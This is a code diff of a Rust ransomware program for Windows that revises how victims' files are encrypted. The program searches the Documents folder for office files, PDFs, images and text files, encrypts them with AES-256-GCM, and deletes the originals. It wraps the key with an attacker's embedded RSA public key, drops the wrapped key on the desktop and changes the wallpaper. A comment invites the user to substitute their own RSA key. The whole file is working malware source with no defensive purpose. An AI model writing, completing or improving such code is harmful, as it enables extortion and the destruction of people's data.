@@ -1,9 +1,13 @@
 use std::ffi::{OsStr, OsString};
-use std::fs::{self, remove_file, File};
+use std::fs::{self, remove_file, File, OpenOptions};
 use std::io::{BufWriter, Read, Write};
 use std::os::windows::ffi::{OsStrExt, OsStringExt};
 
 extern crate winapi;
+use ring::aead::{Aad, BoundKey, Nonce, NonceSequence, SealingKey, UnboundKey, AES_256_GCM};
+use ring::error::Unspecified;
+use ring::rand::{SecureRandom, SystemRandom};
+use ring::aead::NONCE_LEN;
 use winapi::um::sysinfoapi::GetSystemDirectoryW;
 use winapi::um::winuser::{SystemParametersInfoW, SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE, SPIF_SENDCHANGE};
 
@@ -12,137 +16,69 @@ use rsa::pkcs8::DecodePublicKey;
 use rsa::Pkcs1v15Encrypt;
 use rsa::RsaPublicKey;
 
-use orion::hazardous::{
-    aead::xchacha20poly1305::{seal, open, Nonce, SecretKey},
-    mac::poly1305::POLY1305_OUTSIZE,
-    stream::xchacha20::XCHACHA_NONCESIZE,
-};
-
-use orion::hazardous::stream::chacha20::CHACHA_KEYSIZE;
-use orion::kdf::{derive_key, Password, Salt};
 use rand::distributions::Alphanumeric;
 use rand::Rng;
-use rand_core::{OsRng, RngCore};
 use walkdir::WalkDir;
 
 const IMAGE_DATA: &[u8] = include_bytes!(r"resources\backgroound.png");
 
-fn get_random(dest: &mut [u8]) {
-    RngCore::fill_bytes(&mut OsRng, dest);
-}
 
-fn nonce() -> Vec<u8> {
-    let mut randoms: [u8; 24] = [0; 24];
-    get_random(&mut randoms);
-    return randoms.to_vec();
-}
+struct CounterNonceSequence(u32);
 
-fn auth_tag() -> Vec<u8> {
-    let mut randoms: [u8; 32] = [0; 32];
-    get_random(&mut randoms);
-    return randoms.to_vec();
-}
+impl NonceSequence for CounterNonceSequence {
+    // called once for each seal operation
+    fn advance(&mut self) -> Result<Nonce, Unspecified> {
+        let mut nonce_bytes = vec![0; NONCE_LEN];
 
-fn simple_split_encrypted(cipher_text: &[u8]) -> (Vec<u8>, Vec<u8>) {
-    return (
-        cipher_text[..CHACHA_KEYSIZE].to_vec(),
-        cipher_text[CHACHA_KEYSIZE..].to_vec(),
-        )
-}
+        let bytes = self.0.to_be_bytes();
+        nonce_bytes[8..].copy_from_slice(&bytes);
+        println!("nonce_bytes = {}", hex::encode(&nonce_bytes));
 
-fn create_key(password: String, nonce: Vec<u8>) -> SecretKey {
-    let password = Password::from_slice(password.as_bytes()).unwrap();
-    let salt = Salt::from_slice(nonce.as_slice()).unwrap();
-    let kdf_key = derive_key(&password, &salt, 15, 1024, CHACHA_KEYSIZE as u32).unwrap();
-    let key = SecretKey::from_slice(kdf_key.unprotected_as_bytes()).unwrap();
-    return key;
-}
-
-fn encrypt_core(
-    dist: &mut File,
-    contents: Vec<u8>,
-    key: &SecretKey,
-    nonce: Nonce,
-) {
-    let ad = auth_tag();
-    let output_len = match contents.len().checked_add(POLY1305_OUTSIZE + ad.len()) {
-        Some(min_output_len) => min_output_len,
-        None => panic!("Plaintext is too long"),
-    };
-
-    let mut output = vec![0u8; output_len];
-    output[..CHACHA_KEYSIZE].copy_from_slice(ad.as_ref());
-    seal(&key, &nonce, contents.as_slice(), Some(ad.clone().as_slice()), &mut output[CHACHA_KEYSIZE..]).unwrap();
-    dist.write(&output.as_slice()).unwrap();
-}
-
-fn decrypt_core(
-    dist: &mut File,
-    contents: Vec<u8>,
-    key: &SecretKey,
-    nonce: Nonce
-) {
-    let split = simple_split_encrypted(contents.as_slice());
-    let mut output = vec![0u8; split.1.len() - POLY1305_OUTSIZE];
-
-    open(&key, &nonce, split.1.as_slice(), Some(split.0.as_slice()), &mut output).unwrap();
-    dist.write(&output.as_slice()).unwrap();
-}
-
-
-const CHUNK_SIZE: usize = 128; // The size of the chunks you wish to split the stream into.
-
-pub fn encrypt_large_file(
-    file_path: &str,
-    output_path: &str,
-    password: String
-) -> Result<(), orion::errors::UnknownCryptoError> {
-    let mut source_file = File::open(file_path).expect("Failed to open input file");
-    let mut dist = File::create(output_path).expect("Failed to create output file");
-
-    let mut src = Vec::new();
-    source_file.read_to_end(&mut src).expect("Failed to read input file");
-
-    let nonce = nonce();
-
-    dist.write(nonce.as_slice()).unwrap();
-    let key = create_key(password, nonce.clone());
-    let nonce = Nonce::from_slice(nonce.as_slice()).unwrap();
-
-    for (_n_chunk, src_chunk) in src.chunks(CHUNK_SIZE).enumerate() {
-        encrypt_core(&mut dist, src_chunk.to_vec(), &key, nonce)
+        self.0 += 1; // advance the counter
+        Nonce::try_assume_unique_for_key(&nonce_bytes)
     }
-
-    Ok(())
 }
 
-pub fn decrypt_large_file(
-    file_path: &str, 
-    output_path: &str,
-    password: String
-) -> Result<(), orion::errors::UnknownCryptoError> {
-    let mut input_file = File::open(file_path).expect("Failed to open input file");
-    let mut output_file = File::create(output_path).expect("Failed to create output file");
 
-    let mut src: Vec<u8> = Vec::new();
-    input_file.read_to_end(&mut src).expect("Failed to read input file");
+fn encrypt_file(
+    input_file_path: &str,
+    output_file_path: &str,
+    key_bytes: Vec<u8>,
+) -> Result<(), Box<dyn std::error::Error>> {
 
-    let nonce = src[..XCHACHA_NONCESIZE].to_vec();
+    let nonce_sequence = CounterNonceSequence(1);
+    let key = UnboundKey::new(&AES_256_GCM, &key_bytes).unwrap();
 
-    src = src[XCHACHA_NONCESIZE..].to_vec();
+    let mut sealing_key = SealingKey::new(key, nonce_sequence);
 
-    let key = create_key(password, nonce.clone());
-    let nonce = Nonce::from_slice(nonce.as_slice()).unwrap();
 
-    for (_n_chunk, src_chunk) in src.chunks(CHUNK_SIZE + CHACHA_KEYSIZE + POLY1305_OUTSIZE).enumerate() {
-        decrypt_core(&mut output_file, src_chunk.to_vec(), &key, nonce);
-    }
+    let mut input_file = File::open(input_file_path)?;
+    let mut input_data = Vec::new();
+    input_file.read_to_end(&mut input_data)?;
+
+    let mut in_out = input_data.clone();
+
+    let associated_data = Aad::from(b"Ransom");
+
+    let tag = sealing_key.seal_in_place_separate_tag(associated_data, &mut in_out).unwrap();
+
+    let mut output_file = OpenOptions::new()
+        .write(true)
+        .create(true)
+        .open(output_file_path)?;
+    output_file.write_all(&in_out)?;
 
     Ok(())
 }
 
 fn main() {
     let extensions = ["docx", "xlsx", "pdf", "jpeg", "jpg", "txt"];
+
+    let rand = SystemRandom::new();
+
+    // Generate a new symmetric encryption key
+    let mut key_bytes = vec![0; AES_256_GCM.key_len()];
+    let _ = rand.fill(&mut key_bytes);
 
     let documents_dir = match dirs::document_dir() {
         Some(path) => path,
@@ -151,7 +87,6 @@ fn main() {
             return;
         }
     };
-    let pass = generate_random_string(20);
 
     // Change this for your public RSA key
     let pem = "-----BEGIN PUBLIC KEY-----
@@ -167,8 +102,8 @@ SwIDAQAB
     let public_key = RsaPublicKey::from_public_key_pem(pem).unwrap();
     let mut rng = rand::thread_rng();
 
-    let passenc = public_key.encrypt(&mut rng, Pkcs1v15Encrypt, pass.as_bytes()).unwrap();
-    let _ = save_key_to_file(&passenc, "password_encrypted_DONT_DELETE.txt");
+    let passenc = public_key.encrypt(&mut rng, Pkcs1v15Encrypt, &key_bytes).unwrap();
+    let _ = save_key_to_file(&passenc, "password_encrypted_DONT_DELETE.");
 
     for entry in WalkDir::new(documents_dir)
         .into_iter()
@@ -180,7 +115,7 @@ SwIDAQAB
                 .map(|ext| extensions.contains(&ext))
                 .unwrap_or(false)
         }) {
-        let _encrypted_filee = encrypt_large_file(entry.path().to_str().unwrap_or(""), &format!("{}{}", entry.path().to_str().unwrap_or(""), ".enc" ), pass.to_owned());
+        let _encrypted_filee = encrypt_file(entry.path().to_str().unwrap_or(""), &format!("{}{}", entry.path().to_str().unwrap_or(""), ".enc" ), key_bytes.clone());
         let _ = remove_file(entry.path());
     }
 
@@ -216,6 +151,7 @@ SwIDAQAB
     }
 
 }
+
 fn generate_random_string(length: usize) -> String {
     let s : String = rand::thread_rng()
         .sample_iter(&Alphanumeric)
@@ -224,7 +160,6 @@ fn generate_random_string(length: usize) -> String {
         .collect();
     s
 }
-
 
 fn save_key_to_file(key: &[u8], file_name: &str) -> std::io::Result<()> {
     let desktop_dir = match dirs::desktop_dir() {
@@ -236,7 +171,6 @@ fn save_key_to_file(key: &[u8], file_name: &str) -> std::io::Result<()> {
     key_file.write_all(key)?;
     Ok(())
 }
-
 
 fn save_image_to_temp_file(path: &str, data: &[u8]) -> std::io::Result<()> {
     let mut file = File::create(path)?;
